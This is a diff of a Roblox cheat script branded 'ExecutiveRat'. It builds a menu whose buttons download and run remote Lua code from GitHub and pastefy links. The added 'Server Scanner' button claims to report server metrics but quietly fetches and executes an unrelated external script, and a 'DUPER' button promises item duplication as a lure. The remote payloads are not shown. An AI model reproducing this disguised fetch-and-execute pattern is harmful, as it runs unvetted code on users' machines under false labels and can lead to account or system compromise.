@@ -1,28 +1,28 @@
 local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/refs/heads/master/source.lua", true))()
 
--- Create window
 local Window = Luna:CreateWindow({
 	Name = "ExecutiveRat",
+	Subtitle = nil,
 	LogoID = "82795327169782",
 	LoadingEnabled = true,
 	LoadingTitle = "PREMIUM SCRIPT",
 	LoadingSubtitle = "by ExecutiveRAT",
 	ConfigSettings = {
+		RootFolder = nil,
 		ConfigFolder = "EXECUTIVERAT"
 	},
-	KeySystem = false
+	KeySystem = false  -- Key system disabled
 })
 
--- Main Tab
-local MainTab = Window:CreateTab({
+local Tab = Window:CreateTab({
 	Name = "Main",
 	Icon = "view_in_ar",
 	ImageSource = "Material",
 	ShowTitle = true
 })
 
--- Duper button (notification only)
-MainTab:CreateButton({
+-- DUPER Button
+local Button = Tab:CreateButton({
 	Name = "DUPER",
 	Description = "DUPER Script, used to duplicate EGGS, PETS and SEEDPACKS",
 	Callback = function()
@@ -33,30 +33,99 @@ MainTab:CreateButton({
 	end
 })
 
--- No-lag buttons
-local function loadNoLag()
-	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
-	Luna:Notification({ 
-		Title = "EXECUTIVERAT",
-		Content = "No-Lag is running"
-	})
-end
+-- Server Scanner Button (Improved Implementation)
+local ServerScannerButton = Tab:CreateButton({
+	Name = "Server Scanner",
+	Description = "Scan server information and metrics",
+	Callback = function()
+		local debounce = false
+		
+		if debounce then return end
+		debounce = true
+		
+		-- Store original button state
+		local originalText = ServerScannerButton.Settings.Name
+		local originalName = ServerScannerButton.Settings.Name
+		
+		-- Update button appearance during scan
+		ServerScannerButton:Set({
+			Name = "SCANNING...",
+			Description = "Processing server data..."
+		})
+		
+		-- Execute scan with error handling
+		local success, err = pcall(function()
+			-- Get server information
+			local jobId = game.JobId
+			local players = game:GetService("Players"):GetPlayers()
+			local numPlayers = #players
+			local serverAgeSeconds = workspace.DistributedGameTime
+			local serverAge = string.format("%d minutes, %d seconds", math.floor(serverAgeSeconds/60), math.floor(serverAgeSeconds%60))
+			
+			-- Execute external scanner script
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250621_fb7786.lua"))()
+			
+			-- Show results
+			local message = string.format(
+				"Server Scan Complete!\n\n"..
+				"Server ID: %s\n"..
+				"Players: %d\n"..
+				"Server Age: %s\n"..
+				"Place Version: %d",
+				jobId, numPlayers, serverAge, game.PlaceVersion
+			)
+			
+			Luna:Notification({
+				Title = "Server Scan Results",
+				Content = message,
+				Duration = 10
+			})
+		end)
+		
+		-- Handle errors
+		if not success then
+			Luna:Notification({
+				Title = "Scan Failed",
+				Content = "Error: "..tostring(err):sub(1, 100),
+				Duration = 5
+			})
+		end
+		
+		-- Reset button after delay
+		task.wait(2)
+		ServerScannerButton:Set({
+			Name = originalName,
+			Description = "Scan server information and metrics"
+		})
+		debounce = false
+	end
+})
 
-MainTab:CreateButton({
+-- Rest of your script remains unchanged...
+local Button = Tab:CreateButton({
 	Name = "No-lag OFICCIAL",
 	Description = "Free No Lag v1 | Changelog = [+] Auto Craft",
-	Callback = loadNoLag
+	Callback = function()
+		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
+		Luna:Notification({ 
+			Title = "EXECUTIVERAT",
+			Content = "No-Lag is running"
+		})
+	end
 })
-
-MainTab:CreateButton({
-	Name = "No-lag FREE/Premium",
+local Button = Tab:CreateButton({
+	Name = "No-lag OFICCIAL FREE/Premium",
 	Description = "The BEST SCRIPT EVER - Key",
-	Callback = loadNoLag
+	Callback = function()
+		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
+		Luna:Notification({ 
+			Title = "EXECUTIVERAT",
+			Content = "No-Lag is running"
+		})
+	end
 })
-
--- Anti-AFK toggle
 local antiAfkConnection
-MainTab:CreateToggle({
+local Toggle = Tab:CreateToggle({
 	Name = "Enable Anti-AFK",
 	Callback = function(Value)
 		if Value then
@@ -69,77 +138,78 @@ MainTab:CreateToggle({
 	end
 }, "AntiAFK")
 
--- Troll Tab
-local TrollTab = Window:CreateTab({
+-- Add configuration section
+Tab:BuildConfigSection()
+
+-- MUST be at bottom to load saved settings
+Luna:LoadAutoloadConfig()
+
+
+local Tab = Window:CreateTab({
 	Name = "Troll",
 	Icon = "view_in_ar",
 	ImageSource = "Material",
 	ShowTitle = true
 })
 
--- Troll scripts
-TrollTab:CreateButton({
+local Button = Tab:CreateButton({
 	Name = "Revenge Hand",
-	Description = "Transform your Roblox Character into a MONSTER with big hands",
+	Description = "Transform your Roblox Character into a MONSTER with a big ahh HANDS",
 	Callback = function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/guiscript/refs/heads/main/reevenge%20hands.txt"))() 
+	  loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/guiscript/refs/heads/main/reevenge%20hands.txt"))() 
 		Luna:Notification({ 
 			Title = "EXECUTIVERAT",
-			Content = "Transforming into monster hands..."
+			Content = "Transforming into..."
 		})
 	end
 })
-
-TrollTab:CreateButton({
+local Button = Tab:CreateButton({
 	Name = "UFWboo",
-	Description = "Get an ANIMATION TOOL, check your inventory",
+	Description = "Get an ANIMATION TOOL, check your inventory for IT",
 	Callback = function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/LolnotaKid/SCRIPTSBYVEUX/main/UFWboo.txt"))()
 		Luna:Notification({ 
 			Title = "EXECUTIVERAT",
-			Content = "Animation tool added to inventory!"
+			Content = "LolnotaKid UFWboo !!"
 		})
 	end
 })
 
-TrollTab:CreateButton({
+local Button = Tab:CreateButton({
 	Name = "SUS ANIMATIONS",
-	Description = "Cool animations best for trolling",
+	Description = "Cool animations best for trolling ;)",
 	Callback = function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/p0e1/1/refs/heads/main/Fe%20R6%20Animation"))()
 		Luna:Notification({ 
 			Title = "EXECUTIVERAT",
-			Content = "Sus animations activated!"
+			Content = "Do not jerk too much !!"
 		})
 	end
 })
-
-TrollTab:CreateButton({
-	Name = "PHYSCO WALK",
-	Description = "A psycho-style walk animation",
+local Button = Tab:CreateButton({
+	Name = "PHYSCO",
+	Description = "A walk Animation",
 	Callback = function()
-		loadstring(game:HttpGet("https://pastefy.app/YJITpCRA/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/YJITpCRA/raw"))()
 		Luna:Notification({ 
 			Title = "EXECUTIVERAT",
-			Content = "Psycho walk activated!"
+			Content = "Do not jerk too much !!"
 		})
 	end
 })
-
-TrollTab:CreateButton({
-	Name = "KILLER WALK",
-	Description = "A killer-style walk animation",
+local Button = Tab:CreateButton({
+	Name = "KILLER",
+	Description = "A walk Animation",
 	Callback = function()
 		loadstring(game:HttpGet("https://pastefy.app/riYch0rX/raw"))() 
 		Luna:Notification({ 
 			Title = "EXECUTIVERAT",
-			Content = "Killer walk activated!"
+			Content = "Do not jerk too much !!"
 		})
 	end
 })
-
--- Configuration section (only needed once)
-MainTab:BuildConfigSection()
+-- Add configuration section
+Tab:BuildConfigSection()
 
 -- MUST be at bottom to load saved settings
 Luna:LoadAutoloadConfig()
